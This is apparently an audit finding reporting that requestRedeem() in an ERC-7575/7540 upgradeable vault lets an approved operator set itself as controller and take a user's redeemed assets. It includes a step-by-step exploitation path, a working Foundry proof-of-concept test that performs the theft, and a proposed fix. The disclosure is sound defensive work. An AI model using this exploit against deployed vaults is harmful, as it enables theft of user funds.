## Title
Operator Can Steal User Funds by Setting Themselves as Controller in requestRedeem()

## Summary
The `ERC7575VaultUpgradeable.requestRedeem()` function allows approved operators to specify an arbitrary `controller` address when requesting redemptions on behalf of users. A malicious operator can set themselves as the controller, transfer the victim's shares to the vault, and later claim the redeemed assets for themselves, effectively stealing user funds.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ERC7575VaultUpgradeable.sol` - `requestRedeem()` function (lines 715-751)

**Intended Logic:** According to ERC-7540, operators should help users manage their redemption requests. The operator authorization is meant to allow trusted parties to submit requests on behalf of users, with the understanding that the user (owner) controls the redemption request and can claim the assets. [1](#0-0) 

**Actual Logic:** The function performs authorization checks between `msg.sender` (operator) and `owner`, but never validates that the `controller` parameter matches the `owner`. This allows an operator to specify themselves as the controller, taking control of the redemption request. [2](#0-1) 

**Exploitation Path:**
1. **Setup**: Victim (Alice) approves attacker (Bob) as an operator via `shareToken.setOperator(bob, true)` - a legitimate action for trusted delegation
2. **Attack**: Bob calls `requestRedeem(aliceShares, bob, alice)` where controller=bob and owner=alice
3. **Authorization Bypass**: The operator check passes at line 723, skipping allowance validation at lines 724-726
4. **Share Transfer**: `vaultTransferFrom()` transfers Alice's shares to vault without any allowance checks (line 740)
5. **Controller Credit**: `pendingRedeemShares[bob]` is incremented (line 745), crediting the request to Bob instead of Alice
6. **Fulfillment**: Investment Manager fulfills the request, converting pending to claimable for Bob
7. **Theft**: Bob calls `redeem(shares, bob, bob)` and receives assets that belonged to Alice's shares [3](#0-2) 

**Security Property Broken:** Invariant #12 - "No Fund Theft: No double-claims, no reentrancy, no authorization bypass"

## Impact Explanation
- **Affected Assets**: All share tokens held by users who have approved operators
- **Damage Severity**: Complete loss of shares for affected users - attacker can drain 100% of victim's share balance in a single transaction
- **User Impact**: Any user who approves an operator for legitimate purposes (delegation, automated trading, portfolio management) becomes vulnerable to complete fund theft

## Likelihood Explanation
- **Attacker Profile**: Any address approved as an operator by a victim - could be a compromised trusted party, malicious smart contract, or social engineering victim
- **Preconditions**: Victim must have approved attacker as operator via `setOperator(attacker, true)` - a normal operational requirement for delegation features
- **Execution Complexity**: Single transaction - attacker calls `requestRedeem()` with themselves as controller. After fulfillment (controlled by Investment Manager), attacker claims via `redeem()`
- **Frequency**: Can be exploited immediately and repeatedly against any user who has approved operators, draining their entire balance

## Recommendation

In `src/ERC7575VaultUpgradeable.sol`, function `requestRedeem()`, add validation that when called by an operator, the controller must be the owner:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function requestRedeem, after line 726:

function requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {
    if (shares == 0) revert ZeroShares();
    VaultStorage storage $ = _getVaultStorage();

    // ERC7540 REQUIREMENT: Authorization check for redemption
    bool isOwnerOrOperator = owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender);
    if (!isOwnerOrOperator) {
        ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
    }

    // FIXED: When operator calls on behalf of owner, controller must be the owner
    // This prevents operators from stealing funds by setting themselves as controller
    if (isOwnerOrOperator && owner != msg.sender) {
        // msg.sender is an operator, not the owner
        if (controller != owner) {
            revert InvalidController(); // New error: controller must match owner when called by operator
        }
    }

    uint256 ownerShares = IERC20Metadata($.shareToken).balanceOf(owner);
    if (ownerShares < shares) {
        revert ERC20InsufficientBalance(owner, ownerShares, shares);
    }
    
    // ... rest of function unchanged
}
```

Alternative fix: Remove operator authorization entirely from requestRedeem and require ERC-20 allowance for all non-owner callers, eliminating the bypass path.

## Proof of Concept

```solidity
// File: test/Exploit_OperatorTheft.t.sol
// Run with: forge test --match-test test_OperatorStealsViaControllerManipulation -vvv

pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/ShareTokenUpgradeable.sol";
import "./MockAsset.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract Exploit_OperatorTheft is Test {
    ERC7575VaultUpgradeable public vault;
    ShareTokenUpgradeable public shareToken;
    MockAsset public asset;
    
    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice"); // victim
    address public bob = makeAddr("bob"); // attacker (operator)
    address public investmentManager = makeAddr("investmentManager");
    
    function setUp() public {
        vm.startPrank(owner);
        
        asset = new MockAsset();
        
        // Deploy ShareToken with proxy
        ShareTokenUpgradeable shareTokenImpl = new ShareTokenUpgradeable();
        bytes memory shareTokenInitData = abi.encodeWithSelector(
            ShareTokenUpgradeable.initialize.selector, 
            "Test Shares", 
            "TST", 
            owner
        );
        ERC1967Proxy shareTokenProxy = new ERC1967Proxy(address(shareTokenImpl), shareTokenInitData);
        shareToken = ShareTokenUpgradeable(address(shareTokenProxy));
        
        // Deploy Vault with proxy
        ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
        bytes memory vaultInitData = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector, 
            IERC20Metadata(address(asset)), 
            address(shareToken), 
            owner
        );
        ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
        vault = ERC7575VaultUpgradeable(address(vaultProxy));
        
        // Register vault
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentManager(investmentManager);
        
        vm.stopPrank();
        
        // Mint assets to alice
        asset.mint(alice, 100000e18);
    }
    
    function test_OperatorStealsViaControllerManipulation() public {
        uint256 depositAmount = 10000e18;
        
        // SETUP: Alice deposits and gets shares
        vm.startPrank(alice);
        asset.approve(address(vault), depositAmount);
        vault.requestDeposit(depositAmount, alice, alice);
        vm.stopPrank();
        
        vm.prank(investmentManager);
        vault.fulfillDeposit(alice, depositAmount);
        
        vm.prank(alice);
        uint256 aliceShares = vault.deposit(depositAmount, alice);
        
        assertGt(aliceShares, 0, "Alice should have shares");
        assertEq(shareToken.balanceOf(alice), aliceShares, "Alice balance mismatch");
        
        // Alice legitimately approves Bob as operator for portfolio management
        vm.prank(alice);
        shareToken.setOperator(bob, true);
        
        uint256 bobInitialAssets = asset.balanceOf(bob);
        assertEq(bobInitialAssets, 0, "Bob should start with no assets");
        
        // EXPLOIT: Bob (operator) requests redemption with HIMSELF as controller
        vm.prank(bob);
        vault.requestRedeem(aliceShares, bob, alice); // controller=bob, owner=alice
        
        // VERIFY: Alice's shares transferred to vault, but request credited to Bob
        assertEq(shareToken.balanceOf(alice), 0, "Alice shares stolen from her balance");
        assertEq(shareToken.balanceOf(address(vault)), aliceShares, "Vault holds shares");
        assertEq(vault.pendingRedeemRequest(0, bob), aliceShares, "Request credited to Bob (attacker)");
        assertEq(vault.pendingRedeemRequest(0, alice), 0, "Alice has NO control over request");
        
        // Investment manager fulfills redemption (normal protocol operation)
        vm.prank(investmentManager);
        vault.fulfillRedeem(bob, aliceShares);
        
        // EXPLOIT COMPLETION: Bob claims the assets
        vm.prank(bob);
        uint256 assetsReceived = vault.redeem(aliceShares, bob, bob);
        
        // VERIFY: Bob successfully stole Alice's funds
        assertGt(asset.balanceOf(bob), bobInitialAssets, "Bob received stolen assets");
        assertEq(assetsReceived, depositAmount, "Bob got full asset value");
        assertEq(shareToken.balanceOf(alice), 0, "Alice has no shares");
        assertEq(asset.balanceOf(alice), 0, "Alice has no assets");
        
        // Alice cannot claim anything - Bob controls the request
        vm.prank(alice);
        vm.expectRevert(); // Alice has no claimable redemption
        vault.redeem(1, alice, alice);
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Alice's shares stolen:", aliceShares);
        console.log("Assets stolen by Bob:", assetsReceived);
        console.log("Alice remaining balance:", shareToken.balanceOf(alice));
    }
}
```

## Notes

This vulnerability exists specifically in the **upgradeable vault implementation** (`ERC7575VaultUpgradeable` + `ShareTokenUpgradeable`). The non-upgradeable implementation (`WERC7575Vault` + `WERC7575ShareToken`) uses synchronous deposit/redeem without async requests, so this attack vector does not apply there.

The root cause is the combination of:
1. Operator authorization bypassing allowance checks
2. `vaultTransferFrom()` bypassing all allowance validation (including self-allowance) [4](#0-3) 
3. No validation that `controller == owner` when called by an operator
4. The controller having full authority to claim redeemed assets

This is distinct from the known issue about "operator powers" - this is not about centralization risk, but about a logic error allowing unprivileged attackers (who legitimately receive operator approval) to steal funds through parameter manipulation.

### Citations

**File:** src/ERC7575VaultUpgradeable.sol (L719-726)
```text
        // ERC7540 REQUIREMENT: Authorization check for redemption
        // Per spec: "Redeem Request approval of shares for a msg.sender NOT equal to owner may come
        // either from ERC-20 approval over the shares of owner or if the owner has approved the
        // msg.sender as an operator."
        bool isOwnerOrOperator = owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender);
        if (!isOwnerOrOperator) {
            ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
        }
```

**File:** src/ERC7575VaultUpgradeable.sol (L740-746)
```text
        if (!ShareTokenUpgradeable($.shareToken).vaultTransferFrom(owner, address(this), shares)) {
            revert ShareTransferFailed();
        }

        // State changes after successful transfer
        $.pendingRedeemShares[controller] += shares;
        $.activeRedeemRequesters.add(controller);
```

**File:** src/ERC7575VaultUpgradeable.sol (L885-917)
```text
    function redeem(uint256 shares, address receiver, address controller) public nonReentrant returns (uint256 assets) {
        VaultStorage storage $ = _getVaultStorage();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }
        if (shares == 0) revert ZeroShares();

        uint256 availableShares = $.claimableRedeemShares[controller];
        if (shares > availableShares) revert InsufficientClaimableShares();

        // Calculate proportional assets for the requested shares
        uint256 availableAssets = $.claimableRedeemAssets[controller];
        assets = shares.mulDiv(availableAssets, availableShares, Math.Rounding.Floor);

        if (assets == availableAssets) {
            // Remove from active redeem requesters if no more claimable assets and the potential dust
            $.activeRedeemRequesters.remove(controller);
            delete $.claimableRedeemAssets[controller];
            delete $.claimableRedeemShares[controller];
        } else {
            $.claimableRedeemAssets[controller] -= assets;
            $.claimableRedeemShares[controller] -= shares;
        }
        $.totalClaimableRedeemAssets -= assets;
        $.totalClaimableRedeemShares -= shares; // Decrement shares that are being burned

        // Burn the shares as per ERC7540 spec - shares are burned when request is claimed
        ShareTokenUpgradeable($.shareToken).burn(address(this), shares);

        emit Withdraw(msg.sender, receiver, controller, assets, shares);
        if (assets > 0) {
            SafeTokenTransfers.safeTransfer($.asset, receiver, assets);
        }
```

**File:** src/ShareTokenUpgradeable.sol (L749-760)
```text
    function vaultTransferFrom(address from, address to, uint256 amount) external onlyVaults returns (bool success) {
        if (from == address(0)) {
            revert IERC20Errors.ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert IERC20Errors.ERC20InvalidReceiver(address(0));
        }

        // Direct transfer without checking allowance since this is vault-only
        _transfer(from, to, amount);
        return true;
    }
```
